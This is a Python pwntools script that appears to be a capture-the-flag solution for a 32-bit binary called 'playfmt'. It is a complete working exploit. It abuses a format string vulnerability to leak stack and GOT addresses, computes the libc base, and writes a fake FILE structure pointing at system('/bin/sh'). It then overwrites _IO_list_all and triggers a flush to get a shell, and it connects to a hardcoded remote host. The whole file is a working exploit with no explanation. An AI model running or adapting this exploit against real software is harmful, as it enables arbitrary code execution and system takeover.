from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./playfmt")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./playfmt")
else:
	p = remote("120.78.192.35","9999")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
	elf = ELF("./playfmt")

def debugf():
	if debug:
		gdb.attach(p,"b printf\nb _IO_flush_all_lockp")

def send(payload):
	p.recvuntil("\n")
	p.send(payload + "\n" + "\x00")

def write(addr,type_ = True):
	if type_ == True:
		ranget = 4
	else:
		ranget = 1
	for i in range(ranget):
		temp = (ord(p32(stack2)[0]) & 0xff) + i
		#log.success("target1:" + hex(temp))
		if temp == 0:
			payload = "%{off}$hhn".format(off = off1)
		else:
			payload = "%{num}c%{off}$hhn".format(num = temp,off = off1)
		send(payload)
		temp = (ord(p32(addr)[i]) & 0xff)
		#log.success("target2:" + hex(temp))
		if temp == 0:
			payload = "%{off}$hhn".format(off = off2)
		else:
			payload = "%{num}c%{off}$hhn".format(num = temp,off = off2)
		send(payload)
		
def show(addr):
	write(addr)
	#debugf()
	send("aaaa%{off}$s".format(off = off3))

def change(addr,value):
	write(addr,False)
	#debugf()
	if value == 0:
		payload = "%{off}$hhn".format(off = off3)
	else:
		payload = "%{num}c%{off}$hhn".format(num = value,off = off3)
	send(payload)

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
p.recvuntil("=====================\n")
p.recvuntil("=====================")
#debugf()
send("%6$p\n")
stack1 = int(p.recvuntil("\n",drop = True),16)
log.success("ebp1:" + hex(stack1))
send("%14$p\n")
stack2 = int(p.recvuntil("\n",drop = True),16)
log.success("ebp2:" + hex(stack2))
off1 = 6
off2 = 14
off3 = 0x1b - 1
show(elf.got["printf"])
p.recvuntil("a" * 4)
leak_addr = u32(p.recv(4))
log.success("printf:" + hex(leak_addr))
libc.address = leak_addr - libc.symbols["printf"]
log.success("libc_base:" + hex(libc.address))
fake_file_addr = 0x0804B500
cmd = "/bin/sh\x00"
func = libc.symbols["system"]
vtable = fake_file_addr + 8 - 12
write(fake_file_addr)
#debugf()
for i in range(8):
	change(fake_file_addr + i,ord(cmd[i]))
for i in range(4):
	change(fake_file_addr + 8 + i,ord(p32(func)[i]))
for i in range(1):
	change(fake_file_addr + 20 + i,1)
for i in range(4):
	change(fake_file_addr + 0x94 + i,ord(p32(vtable)[i]))
target = libc.symbols["_IO_list_all"]
write(target)
for i in range(4):
	change(target + i,ord(p32(fake_file_addr)[i]))
debugf()
send("quit")
#debugf()
p.interactive()
